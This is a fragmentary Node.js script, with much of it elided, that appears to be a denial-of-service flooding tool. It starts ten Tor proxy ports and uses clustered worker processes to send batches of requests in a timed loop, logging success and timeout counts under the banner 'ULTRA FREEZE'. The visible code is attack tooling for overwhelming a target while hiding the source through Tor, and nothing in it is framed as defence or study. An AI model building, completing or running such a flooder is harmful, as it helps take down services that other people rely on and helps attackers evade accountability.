...
// ====================== 10 TOR PROXIES ======================
const PROXY_PORTS = Array.from({length: 10}, (_, i) => 9050 + i);
...
if (cluster.isPrimary) {
    console.log("\n=== MULTI-TOR 10 INSTANCES ULTRA FREEZE ===");
    console.log(`Ports     : 9050-9059`);
...
(async () => {
    ...
    console.log(`[Worker ${process.pid}] 🚀 10 Tor proxies ready`);
    ...
    while (Date.now() < endTime) {
        ...
        for (let i = 0; i < PER_TICK; i++) {
            ...
            batch.push(
                ...
                .then((response) => {
                    okCount++; reqCount++;
                    if (DEBUG && Math.random() < 0.05) console.log(`[W${process.pid}] ✅ [${port}] [${response.status}]`);
                })
                .catch((error) => {
                    errCount++; reqCount++;
                    const status = error.response?.status || "TIMEOUT";
                    if (DEBUG) console.log(`[W${process.pid}] ❌ [${port}] [${status}]`);
                })
            );
        }
